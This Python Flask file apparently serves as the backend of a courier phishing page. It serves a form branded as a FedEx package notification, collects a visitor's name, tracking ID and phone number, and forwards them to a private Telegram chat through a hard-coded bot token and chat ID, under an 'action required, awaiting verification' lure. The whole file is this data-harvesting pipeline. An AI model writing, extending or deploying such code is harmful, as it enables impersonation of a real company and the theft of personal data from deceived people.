from flask import Flask, request, jsonify, render_template
import requests
import os
import json

# --- Configuration ---
# Best practice: Load these from environment variables for security
TELEGRAM_BOT_TOKEN = "REDACTED_TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID = "8986370233"

# --- Flask App Initialization ---
app = Flask(__name__)

# ==============================================================
# 1. ROUTE TO SERVE THE STATIC FRONTEND PAGE
# ==============================================================
@app.route('/')
def index():
    """Serves the HTML page containing the FedEx notification form."""
    # Assuming you save the final HTML code as 'index.html'
    return render_template('index.html')

# ==============================================================
# 2. ROUTE TO PROCESS THE FORM DATA AND SEND TO TELEGRAM
# ==============================================================
@app.route('/submit_package', methods=['POST'])
def submit_package():
    """
    Receives POST data from the JavaScript on the client side,
    sends it to the Telegram API, and returns a success/failure status.
    """
    data = request.get_json()

    if not data:
        return jsonify({"success": False, "error": "No data received in the request body."}), 400

    # Extracting fields based on the HTML form structure
    name = data.get('name')
    tracking_id = data.get('tracking_id')
    phone = data.get('phone')

    if not name or not tracking_id or not phone:
        return jsonify({"success": False, "error": "Missing required fields: Name, Tracking ID, and Phone are required."}), 400

    # --- 1. Construct the Detailed Message for Telegram ---
    # Using Markdown formatting for bot clarity
    message_content = (
        "📦 *📦 FEDEX PACKAGE NOTIFICATION RECEIVED* 📦*\n"
        "------------------------------------------\n"
        f"🟢 *ACTION REQUIRED:* Package Awaiting Verification\n"
        "------------------------------------------\n"
        f"👤 *Recipient Name:* {name}\n"
        f"🔢 *Tracking ID:* {tracking_id}\n"
        f"📞 *Contact Phone:* {phone}\n"
        "------------------------------------------\n"
        "✅ *Ready for dispatch/follow-up.*"
    )

    # --- 2. Send Message to Telegram Bot API ---
    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message_content,
        'parse_mode': 'Markdown' # Tells Telegram to interpret bold/italics/etc.
    }

    try:
        response = requests.post(telegram_url, data=payload)
        response.raise_for_status() # Throws an exception for bad status codes (4xx or 5xx)

        # If successful, return success to the frontend
        return jsonify({"success": True, "message": "Notification successfully sent to Telegram Bot."})

    except requests.exceptions.RequestException as e:
        # If Telegram API fails, return failure to the frontend
        print(f"Error contacting Telegram API: {e}")
        return jsonify({"success": False, "error": f"Failed to connect to Telegram Bot API. Error: {str(e)}"}), 503


if __name__ == '__main__':
    # For development, set debug=True so changes are automatically reloaded
    app.run(debug=True, port=5000) 